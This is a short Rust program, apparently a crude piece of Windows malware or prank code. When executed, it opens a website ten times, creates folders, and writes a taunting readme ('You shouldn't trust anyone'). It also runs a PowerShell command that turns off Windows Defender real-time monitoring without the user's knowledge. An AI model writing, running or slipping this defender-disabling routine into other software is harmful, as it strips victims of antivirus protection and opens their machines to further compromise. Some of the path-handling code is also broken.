use std::process::Command;
use std::{env, fs, path};
use webbrowser;
fn main() {
    if let Err(err) = create_folders_and_tab() {
        eprintln!("Error: {}", err);
    }
    windwos_defender();
    mkdir();
}

fn create_folders_and_tab() -> std::io::Result<()> {
    // Open the website in the browser
    for _ in 1..=10 {
        open_website_in_browser("https://askander.vercel.app");
    }

    let mut index_dir = 0;

    loop {
        let desktop_path = match env::var("USERPROFILE") {
            Ok(user_profile) => {
                let mut path_buf = path::PathBuf::from(user_profile);
                path_buf.push(r"C:\");
                path_buf
            }
            Err(_) => {
                println!("Failed to get the desktop path.");
                continue;
            }
        };
        let new_dir_name = format!("Askander_{}", index_dir);
        let new_dir_path = desktop_path.join(&new_dir_name);

        if !new_dir_path.exists() {
            fs::create_dir(&new_dir_path)?;
            println!("Directory '{}' created successfully.", new_dir_name);
            break; // Exit the loop after creating one directory
        } else {
            index_dir += 1;
        }

        // Sleep for a while before the next iteration
    }

    Ok(())
}

fn open_website_in_browser(url: &str) {
    match webbrowser::open(url) {
        Ok(_) => println!("Opened website in the default browser."),
        Err(err) => eprintln!("Failed to open website: {}", err),
    }
}

fn windwos_defender() {
    Command::new("powershell")
        .args(&[
            "-Command",
            "Set-MpPreference -DisableRealtimeMonitoring $true",
        ])
        .output()
        .expect("Failed to disable Windows Defender.");
}

fn mkdir() {
    let the_command = r"mkdir C:\\hamdymohamedak";

    let output = Command::new("powershell")
        .args(["/C", the_command])
        .output()
        .expect("Failed to execute command");

    if output.status.success() {
        println!("Directory created successfully");
    } else {
        let stderr = String::from_utf8_lossy(&output.stderr);
        println!("Failed to create directory: {}", stderr);
    };

    let output_two = Command::new("powershell")
    .args(&["/C", r#"cd C:\\hamdymohamedak ;  New-Item readme.txt ; Set-Content readme.txt 'You shouldn''t trust anyone, sorry for that'"#])
    .output()
    .expect("Failed to execute command");

    if !output_two.status.success() {
        println!("Command failed: {:?}", output_two);
    }
}
